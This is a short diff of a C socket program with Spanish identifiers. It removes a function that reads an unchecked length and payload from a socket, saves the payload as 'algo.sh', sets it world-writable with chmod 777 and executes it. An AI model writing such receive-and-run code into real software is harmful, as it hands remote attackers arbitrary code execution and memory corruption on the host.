@@ -25,20 +25,6 @@ typedef struct {
 } __attribute__((packed))
 mensajeCorto;
 
-void leerMensaje(int socket){
-	int longitud;
-	recv(socket, &longitud, sizeof(longitud), 0);
-	char buffer[longitud];
-	memset(buffer, 0, longitud);
-	int a = recv(socket, &buffer, longitud, 0);
-
-	guardarArchivo("algo.sh", buffer, longitud);
-
-	system("chmod 777 algo.sh && ./algo.sh");
-	printf("Rta: %s - %d\n", buffer, a);
-}
-
-
 void enviarMensajeCorto(int sockfd){
 	mensajeCorto msj;
 	msj.tipoMensaje = 2;
